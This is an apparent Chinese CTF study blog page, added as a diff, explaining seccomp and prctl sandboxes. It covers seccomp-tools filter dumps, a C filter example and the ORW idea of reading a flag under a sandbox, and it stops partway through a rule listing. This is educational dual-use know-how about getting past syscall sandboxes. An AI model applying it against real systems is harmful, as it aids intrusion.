@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>
+    2024-1-26沙盒的学习
+  </title>
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  <meta name="author" content="sheep">
+  <link rel="canonical" href="http://example.com/2024/01/27/2024-1-26%E6%B2%99%E7%9B%92%E7%9A%84%E5%AD%A6%E4%B9%A0/">
+  
+  
+  <link rel="icon" href='/img/favicon.ico'>
+  
+  
+  
+<link rel="stylesheet" href="/css/b4c95347.css">
+
+  <script>window.i18n = {"tip-status-done":"完成","tip-status-default":"全部","tip-status-todo":"计划","tip-status-doing":"进行","tip-status-other":"其他","text-select":"选择","text-move":"移动","text-esc":"退出","January":"一月","February":"二月","March":"三月","April":"四月","May":"五月","June":"六月","July":"七月","August":"八月","September":"九月","October":"十月","November":"十一月","December":"十二月"}</script>
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body id="app">
+  <aside id="aside-box" class="left-aside">
+    <div class="header">
+      
+<link rel="stylesheet" href="/css/61875ce9.css">
+
+<div class="profile">
+  <a class="badge" href="/">
+    <span>Hi</span>
+    <span>sheep</span>
+  </a>
+  <cosy-tooltip id="left-aside-button" placement="right">
+    <span slot="content">
+      <span>显示 / 隐藏 左侧导航</span>
+      <cosy-short-key>[</cosy-short-key>
+    </span>
+    <cosy-icon>
+      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+        <g fill="none">
+          <path d="M16 4c1.104-.019 2 .896 2 2v8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h12zm1 2a1 1 0 0 0-1-1h-2.995v10H16a1 1 0 0 0 1-1V6zm-4.995 9V5H4.001a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8.004z" fill="currentColor"></path>
+        </g>
+      </svg>
+    </cosy-icon>
+  </cosy-tooltip>
+</div>
+
+<script src="/js/a66044b6.js"></script>
+
+      
+
+
+<cosy-search id="post-search" placeholder="搜索">
+  <div slot="short-key">
+    <cosy-short-key>⌘</cosy-short-key>
+    <cosy-short-key>K</cosy-short-key>
+  </div>
+</cosy-search>
+
+
+<script>
+  window.algolia = {
+    appId: "R34LY1BBPU",
+    SearchOnlyAPIKey: "4fd025154505a4b00fb416f52993d700"
+  }
+</script>
+
+
+<script src="/js/5f00f278.js"></script>
+
+    </div>
+    <div class="aside-category">
+      
+<link rel="stylesheet" href="/css/db04a759.css">
+
+
+<nav class="category-nav cosy-scrollbar">
+  <ul><li data-path="archives">
+        <a href="/archives">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M3.5 3A1.5 1.5 0 0 0 2 4.5v4A1.5 1.5 0 0 0 3.5 10h9A1.5 1.5 0 0 0 14 8.5v-4A1.5 1.5 0 0 0 12.5 3h-9zM3 4.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v4a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-4zm.5 6.5A1.5 1.5 0 0 0 2 12.5v4A1.5 1.5 0 0 0 3.5 18h9a1.5 1.5 0 0 0 1.5-1.5v-4a1.5 1.5 0 0 0-1.5-1.5h-9zM3 12.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v4a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-4zm14-.063a2.003 2.003 0 0 1-2.5-1.937A2 2 0 0 1 16 8.563a2.005 2.005 0 0 1 1 0a2 2 0 0 1 0 3.874zM16.5 3a.5.5 0 0 1 .5.5v4.041a3.02 3.02 0 0 0-1 0V3.5a.5.5 0 0 1 .5-.5zm0 10.5c-.17 0-.337-.014-.5-.041V17.5a.5.5 0 0 0 1 0v-4.041c-.163.027-.33.041-.5.041z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">归档</div>
+        </a>
+      </li><li data-path="cosy-roadmap">
+        <a href="/cosy-roadmap">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M9.384 2a1 1 0 0 0-.966.742L4.616 17H2.5a.5.5 0 0 0 0 1h15a.5.5 0 0 0 0-1h-2.116L11.582 2.742A1 1 0 0 0 10.616 2H9.384zM5.651 17l.8-3H11.5a.5.5 0 0 0 0-1H6.717l.534-2H10.5a.5.5 0 0 0 0-1H7.517l1.867-7h1.232l3.733 14H5.651z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">路线图</div>
+        </a>
+      </li><li data-path="cosy-resume">
+        <a href="/cosy-resume">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M8.5 4.498a1.5 1.5 0 1 1 3 0a1.5 1.5 0 0 1-3 0zm1.5-2.5a2.5 2.5 0 0 0-2.43 3.086L5.471 4.15a1.761 1.761 0 0 0-2.317.88c-.4.882-.008 1.917.877 2.31L7 8.662v2.287l-1.877 4.645a1.75 1.75 0 0 0 3.245 1.311l1.556-3.849a.073.073 0 0 1 .028-.038a.086.086 0 0 1 .046-.012c.02 0 .035.005.046.012a.074.074 0 0 1 .028.038l1.555 3.849a1.75 1.75 0 0 0 3.245-1.311L13 10.96V8.662l2.968-1.322a1.74 1.74 0 0 0 .877-2.31a1.761 1.761 0 0 0-2.317-.88l-2.097.934a2.5 2.5 0 0 0-2.43-3.086zM4.065 5.444a.761.761 0 0 1 1-.38l3.918 1.744a2.5 2.5 0 0 0 2.034 0l3.918-1.744a.761.761 0 0 1 1 .38a.739.739 0 0 1-.373.983l-2.969 1.321a1 1 0 0 0-.593.914v2.298a1 1 0 0 0 .073.375l1.872 4.633a.75.75 0 0 1-1.39.562l-1.556-3.849c-.364-.9-1.639-.9-2.003 0l-1.555 3.85a.75.75 0 1 1-1.39-.562l1.876-4.646A1 1 0 0 0 8 10.95V8.662a1 1 0 0 0-.593-.914L4.438 6.427a.739.739 0 0 1-.373-.983z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">简历</div>
+        </a>
+      </li><li data-path="link">
+        <a href="/link">
+          <svg t="1705378180027" class="icon" viewBox="-250 -250 1400 1400" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1450" width="200" height="200"><path d="M593.94368 715.648a10.688 10.688 0 0 0-14.976 0L424.21568 870.4c-71.68 71.68-192.576 79.232-271.68 0-79.232-79.232-71.616-200 0-271.616l154.752-154.752a10.688 10.688 0 0 0 0-15.04l-52.992-52.992a10.688 10.688 0 0 0-15.04 0L84.50368 530.688a287.872 287.872 0 0 0 0 407.488 288 288 0 0 0 407.488 0l154.752-154.752a10.688 10.688 0 0 0 0-15.04l-52.736-52.736z m344.384-631.168a288.256 288.256 0 0 1 0 407.616l-154.752 154.752a10.688 10.688 0 0 1-15.04 0l-52.992-52.992a10.688 10.688 0 0 1 0-15.104l154.752-154.688c71.68-71.68 79.232-192.448 0-271.68-79.104-79.232-200-71.68-271.68 0L443.92768 307.2a10.688 10.688 0 0 1-15.04 0l-52.864-52.864a10.688 10.688 0 0 1 0-15.04l154.88-154.752a287.872 287.872 0 0 1 407.424 0z m-296.32 240.896l52.672 52.736a10.688 10.688 0 0 1 0 15.04l-301.504 301.44a10.688 10.688 0 0 1-15.04 0l-52.736-52.672a10.688 10.688 0 0 1 0-15.04l301.632-301.504a10.688 10.688 0 0 1 15.04 0z" fill="currentColor" p-id="1451"></path></svg>
+          <div class="ellipsis">友链</div>
+        </a>
+      </li></ul>
+  <ul><li class="active">
+        <a href="/categories/2024ROIS%E5%86%AC%E4%BB%A4%E8%90%A5/">
+          
+          <div class="ellipsis">
+            <span>2024ROIS冬令营</span>
+          </div>
+        </a>
+      </li><li class="">
+        <a href="/categories/Pwn%E7%9F%A5%E8%AF%86/">
+          
+          <div class="ellipsis">
+            <span>Pwn知识</span>
+          </div>
+        </a>
+      </li><li class="">
+        <a href="/categories/%E5%B0%8F%E6%AF%94%E8%B5%9B/">
+          
+          <div class="ellipsis">
+            <span>小比赛</span>
+          </div>
+        </a>
+      </li><li class="">
+        <a href="/categories/%E6%80%BB%E7%BB%93/">
+          
+          <div class="ellipsis">
+            <span>总结</span>
+          </div>
+        </a>
+      </li></ul>
+</nav>
+
+
+<script src="/js/118098c2.js"></script>
+
+    </div>
+    <div class="bottom">
+      <cosy-tooltip id="button-preference" placement="right">
+        <span slot="content">
+          <span>偏好</span>
+          <cosy-short-key>⌘</cosy-short-key>
+          <cosy-short-key>p</cosy-short-key>
+        </span>
+        <cosy-icon bordered id="button-about-cosy-theme">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 16 16">
+            <g fill="none">
+              <path d="M8 6a2 2 0 1 0 0 4a2 2 0 0 0 0-4zM7 8a1 1 0 1 1 2 0a1 1 0 0 1-2 0zm3.618-3.602a.708.708 0 0 1-.824-.567l-.26-1.416a.354.354 0 0 0-.275-.282a6.072 6.072 0 0 0-2.519 0a.354.354 0 0 0-.275.282l-.259 1.416a.71.71 0 0 1-.936.538l-1.359-.484a.355.355 0 0 0-.382.095c-.569.627-1 1.367-1.262 2.173a.352.352 0 0 0 .108.378l1.102.931a.704.704 0 0 1 0 1.076l-1.102.931a.352.352 0 0 0-.108.378A5.986 5.986 0 0 0 3.53 12.02a.355.355 0 0 0 .382.095l1.36-.484a.708.708 0 0 1 .936.538l.258 1.416c.026.14.135.252.275.281a6.075 6.075 0 0 0 2.52 0a.353.353 0 0 0 .274-.281l.26-1.416a.71.71 0 0 1 .936-.538l1.359.484c.135.048.286.01.382-.095c.569-.627 1-1.367 1.262-2.173a.352.352 0 0 0-.108-.378l-1.102-.931a.703.703 0 0 1 0-1.076l1.102-.931a.352.352 0 0 0 .108-.378A5.985 5.985 0 0 0 12.47 3.98a.355.355 0 0 0-.382-.095l-1.36.484a.71.71 0 0 1-.111.03zm-6.62.58l.937.333a1.71 1.71 0 0 0 2.255-1.3l.177-.97a5.105 5.105 0 0 1 1.265 0l.178.97a1.708 1.708 0 0 0 2.255 1.3L12 4.977c.255.334.467.698.63 1.084l-.754.637a1.704 1.704 0 0 0 0 2.604l.755.637a4.99 4.99 0 0 1-.63 1.084l-.937-.334a1.71 1.71 0 0 0-2.255 1.3l-.178.97a5.099 5.099 0 0 1-1.265 0l-.177-.97a1.708 1.708 0 0 0-2.255-1.3L4 11.023a4.987 4.987 0 0 1-.63-1.084l.754-.638a1.704 1.704 0 0 0 0-2.603l-.755-.637c.164-.386.376-.75.63-1.084z" fill="currentColor"></path>
+            </g>
+          </svg>
+        </cosy-icon>
+      </cosy-tooltip>
+    </div>
+  </aside>
+  <main>
+    
+<link rel="stylesheet" href="/css/9bb9a539.css">
+
+
+<div class="post-container">
+  <header>
+    <div class="left">
+      
+<link rel="stylesheet" href="/css/7d333f9e.css">
+
+<nav class="breadcrumb">
+  <section>
+    <cosy-tooltip placement="bottom-left">
+      <span slot="content"><span>首页</span>
+        <cosy-short-key>⌘</cosy-short-key>
+        <cosy-short-key>H</cosy-short-key>
+      </span>
+      <cosy-icon href="/">
+        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+          <g fill="none">
+            <path d="M8.998 2.388a1.5 1.5 0 0 1 2.005 0l5.5 4.942A1.5 1.5 0 0 1 17 8.445V15.5a1.5 1.5 0 0 1-1.5 1.5H13a1.5 1.5 0 0 1-1.5-1.5V12a.5.5 0 0 0-.5-.5H9a.5.5 0 0 0-.5.5v3.5A1.5 1.5 0 0 1 7 17H4.5A1.5 1.5 0 0 1 3 15.5V8.445c0-.425.18-.83.498-1.115l5.5-4.942zm1.336.744a.5.5 0 0 0-.668 0l-5.5 4.942A.5.5 0 0 0 4 8.445V15.5a.5.5 0 0 0 .5.5H7a.5.5 0 0 0 .5-.5V12A1.5 1.5 0 0 1 9 10.5h2a1.5 1.5 0 0 1 1.5 1.5v3.5a.5.5 0 0 0 .5.5h2.5a.5.5 0 0 0 .5-.5V8.445a.5.5 0 0 0-.166-.371l-5.5-4.942z" fill="currentColor"></path>
+          </g>
+        </svg>
+      </cosy-icon>
+    </cosy-tooltip>
+    
+    
+    <svg class="arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+      <g fill="none">
+        <path d="M7.733 4.207a.75.75 0 0 1 1.06.026l5.001 5.25a.75.75 0 0 1 0 1.035l-5 5.25a.75.75 0 1 1-1.087-1.034L12.216 10l-4.51-4.734a.75.75 0 0 1 .027-1.06z" fill="currentColor"></path>
+      </g>
+    </svg>
+    <a class="ellipsis" href="/categories/2024ROIS%E5%86%AC%E4%BB%A4%E8%90%A5/">
+      2024ROIS冬令营
+    </a>
+    
+    
+    
+    <svg class="arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+      <g fill="none">
+        <path d="M7.733 4.207a.75.75 0 0 1 1.06.026l5.001 5.25a.75.75 0 0 1 0 1.035l-5 5.25a.75.75 0 1 1-1.087-1.034L12.216 10l-4.51-4.734a.75.75 0 0 1 .027-1.06z" fill="currentColor"></path>
+      </g>
+    </svg>
+    <span class="ellipsis">
+      2024-1-26沙盒的学习
+    </span>
+    
+  </section>
+</nav>
+
+
+<script src="/js/31d6cfe0.js"></script>
+
+    </div>
+    <div class="right">
+      
+      <cosy-tooltip id="toc-show-button" placement="left">
+        <span slot="content">
+          <span>显示 / 隐藏 文章目录</span>
+          <cosy-short-key>]</cosy-short-key>
+        </span>
+        <cosy-icon>
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+            <g fill="none">
+              <path d="M4 4c-1.104-.019-2 .896-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2H4zM3 6a1 1 0 0 1 1-1h2.995v10H4a1 1 0 0 1-1-1V6zm4.995 9V5h8.004a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1H7.995z" fill="currentColor"></path>
+            </g>
+          </svg>
+        </cosy-icon>
+      </cosy-tooltip>
+      
+    </div>
+  </header>
+  <div class="content">
+    <main class="cosy-scrollbar">
+      <div class="article-container">
+        <!-- 渲染文章内容 -->
+        <article>
+          <!-- 文章标题 -->
+          <h1 class="post-title">2024-1-26沙盒的学习</h1>
+          <div class="last-updated">
+            上次更新: 2024-01-27 00:05:25
+          </div>
+          <!-- 文章 -->
+          <h1 id="沙盒"><a href="#沙盒" class="headerlink" title="沙盒"></a>沙盒</h1><h2 id="什么是orw？"><a href="#什么是orw？" class="headerlink" title="什么是orw？"></a>什么是orw？</h2><p>所谓orw就是open read write 打开flag 写入flag 输出flag</p>
+<h2 id="什么是seccomp"><a href="#什么是seccomp" class="headerlink" title="什么是seccomp?"></a>什么是seccomp?</h2><p>seccomp: seccomp是一种内核中的安全机制，正常情况下，程序可以使用所有的syscall,这是不安全的，比如程序劫持程序流后通过execve的syscall来getshell。所以可以通过seccomp_init、seccomp_rule_add、seccomp_load配合 或者prctl来ban掉一些系统调用.</p>
+<p>在实战中我们可以通过 <code>seccomp-tools</code>来查看程序是否启用了沙箱, <code>seccomp-tools</code>工具安装方法如下:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gcc ruby-dev
+$ gem <span class="token function">install</span> seccomp-tools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>安装完成后通过 <code>seccomp-tools dump ./pwn</code>即可查看程序沙箱</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">q@ubuntu<span class="token operator">:</span><span class="token operator">~</span>$ seccomp<span class="token operator">-</span>tools dump <span class="token punctuation">.</span><span class="token operator">/</span>not
+ line  CODE  JT   JF      K
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+ <span class="token number">0000</span><span class="token operator">:</span> <span class="token number">0x20</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000004</span>  A <span class="token operator">=</span> arch
+ <span class="token number">0001</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x08</span> <span class="token number">0xc000003e</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0010</span>
+ <span class="token number">0002</span><span class="token operator">:</span> <span class="token number">0x20</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  A <span class="token operator">=</span> sys_number
+ <span class="token number">0003</span><span class="token operator">:</span> <span class="token number">0x35</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x40000000</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0005</span>
+ <span class="token number">0004</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x05</span> <span class="token number">0xffffffff</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0010</span>
+ <span class="token number">0005</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x03</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> read<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span>
+ <span class="token number">0006</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x02</span> <span class="token number">0x00</span> <span class="token number">0x00000001</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> write<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span>
+ <span class="token number">0007</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x01</span> <span class="token number">0x00</span> <span class="token number">0x00000002</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> open<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span>
+ <span class="token number">0008</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x0000003c</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> exit<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0010</span>
+ <span class="token number">0009</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x7fff0000</span>  <span class="token keyword">return</span> ALLOW
+ <span class="token number">0010</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword">return</span> KILL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>怎么读取?</p>
+<p>该规则描述了一个程序的系统调用过滤策略。它的逻辑如下：</p>
+<ol>
+<li>检查架构是否为 x86_64（ARCH_X86_64）。如果不是，跳转到标签 0010。</li>
+<li>获取系统调用号（sys_number）。</li>
+<li>如果系统调用号小于 0x40000000，跳转到标签 0005。</li>
+<li>如果系统调用号不等于 0xffffffff，跳转到标签 0010。</li>
+<li>如果系统调用号是 read，则跳转到标签 0009。</li>
+<li>如果系统调用号是 write，则跳转到标签 0009。</li>
+<li>如果系统调用号是 open，则跳转到标签 0009。</li>
+<li>如果系统调用号不是 exit，则跳转到标签 0010。</li>
+<li>返回允许执行该系统调用。</li>
+<li><strong>返回拒绝执行该系统调用（终止进程）。</strong></li>
+</ol>
+<h2 id="怎么实现沙盒？"><a href="#怎么实现沙盒？" class="headerlink" title="怎么实现沙盒？"></a>怎么实现沙盒？</h2><p>在ctf中常见的实现沙箱的机制有两种，一种是<code>prctl函数调用</code>，另一种就是<code>seccomp库函数</code></p>
+<p>而其一般都会禁用execve函数，使之无法直接getshell</p>
+<p>在严格模式下甚至只支持exit()，sigreturn()，read()和write()的使用，使用其他系统调用都将会杀掉进程</p>
+<h3 id="prctl函数调用"><a href="#prctl函数调用" class="headerlink" title="prctl函数调用"></a>prctl函数调用</h3><p>可以通过第一个参数控制程序进程去做什么，该参数常见得为<code>38</code>和<code>22</code>两种情况</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">prctl</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>第一个参数为38，第二个参数为1时，禁用execve且子进程一样</li>
+</ul>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">prctl</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>第一个参数为22</li>
+<li>第二个参数为1时，只允许调用read&#x2F;write&#x2F;_exit(not exit_group)&#x2F;sigreturn这几个syscall</li>
+<li>第二个参数为2时，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则</li>
+</ul>
+<h3 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h3><p>首先对seccomp进行初始化</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>为0表示白名单模式，为0x7fff0000U则为黑名单模式</li>
+</ul>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//之后对seccomp添加规则</span>
+<span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ul>
+<li>v1对应上面初始化后返回得值</li>
+<li>0x7fff0000U即黑名单模式</li>
+<li>2对应系统调用号</li>
+<li>0 对应系统调用所限制使用得参数数量，0即不限制</li>
+</ul>
+<p>禁止read函数第一个参数为0的调用的函数</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;seccomp.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span>
+__int64_t <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    scmp_filter_ctx v1<span class="token punctuation">;</span>
+    <span class="token keyword">int</span> rc<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    
+    v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span>SCMP_ACT_ALLOW<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span>v1<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    rc <span class="token operator">=</span> <span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token function">SCMP_ACT_ERRNO</span><span class="token punctuation">(</span>EACCES<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">SCMP_A0</span><span class="token punctuation">(</span>SCMP_CMP_EQ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>rc<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>
+    rc <span class="token operator">=</span> <span class="token function">seccomp_load</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>rc<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> test<span class="token punctuation">;</span>
+    test<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token keyword">return</span> test<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    __int64_t result <span class="token operator">=</span> <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Result: %ld\n"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="编写沙箱规则的shellcode"><a href="#编写沙箱规则的shellcode" class="headerlink" title="编写沙箱规则的shellcode"></a>编写沙箱规则的shellcode</h2><p>使用seccomp-tools生成规则，一条规则是8个字节</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#cat 1.asm</span>
+A <span class="token operator">=</span> sys_number
+A <span class="token operator">==</span> <span class="token number">257</span>? e0:next
+A <span class="token operator">==</span> <span class="token number">1</span>? ok:next
+<span class="token builtin class-name">return</span> ALLOW
+e0:
+<span class="token builtin class-name">return</span> ERRNO<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+ok:
+<span class="token builtin class-name">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>规则如下：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#seccomp-tools asm 1.asm -f raw |seccomp-tools disasm -</span>
+ line  CODE  JT   JF      K
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+ 0000: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number
+ 0001: 0x15 0x02 0x00 0x00000101  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> openat<span class="token punctuation">)</span> goto 0004
+ 0002: 0x15 0x02 0x00 0x00000001  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">write</span><span class="token punctuation">)</span> goto 0005
+ 0003: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW
+ 0004: 0x06 0x00 0x00 0x00050000  <span class="token builtin class-name">return</span> ERRNO<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
